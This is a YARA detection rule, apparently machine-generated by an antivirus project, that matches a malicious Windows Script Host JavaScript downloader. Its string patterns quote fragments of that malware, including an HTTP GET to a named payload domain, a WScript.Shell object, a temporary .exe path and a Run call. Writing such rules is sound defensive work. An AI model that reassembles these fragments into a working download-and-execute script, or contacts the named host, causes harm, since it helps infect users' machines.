rule sig_20160330_5c92ef1a52642b598b4400f651c36f49 {
  meta:
    description = "datamaliciousorder - file 20160330_5c92ef1a52642b598b4400f651c36f49.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "35b0b35cad9eda3e24b16ca61a010c6fe31d116c4243b31945899e9bff256df5"

  strings:
    $s1  = "OP[MD](\"GET\", \"http://grzegorzschreiber.pl/n7dak\", false);" fullword ascii
    $s2  = "function Q(SD, F){SR = SR * 1; return SD - F;};" fullword ascii
    $s3  = "var Z0 = function M() {return WScript[YN](\"WScript\"+\".Shell\");}(), WZ = 11;" fullword ascii
    $s4  = "if (OP[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function I() {return Z0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"viz2Qm9C.ex\" + \"e\";};" fullword ascii
    $s6  = "function XV(){return FQ + \"\";};" fullword ascii
    $s7  = "function PI(Q0){Z0[\"Run\"](Q0, SR, SR);};" fullword ascii
    $s8  = "function LZ() {return ((AU == true) && (AU == K)) ? 1 : SR;};" fullword ascii
    $s9  = "var J0 = new this[\"Date\"]();" fullword ascii
    $s10 = "return Q(I0, N0);" fullword ascii
    $s11 = "function N(D) {var LI = (1, 2, 3, 4, 5, D); return LI;};" fullword ascii
    $s12 = "function BH(){return 22;};" fullword ascii
    $s13 = "function GD()" fullword ascii
    $s14 = "function X(){return YN;};" fullword ascii
    $s15 = "}while (YS);" fullword ascii
    $s16 = "K = true; " fullword ascii
    $s17 = "var K = false;" fullword ascii
    $s18 = "AU = true; " fullword ascii
    $s19 = "var AU = false;" fullword ascii
    $s20 = "var D0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}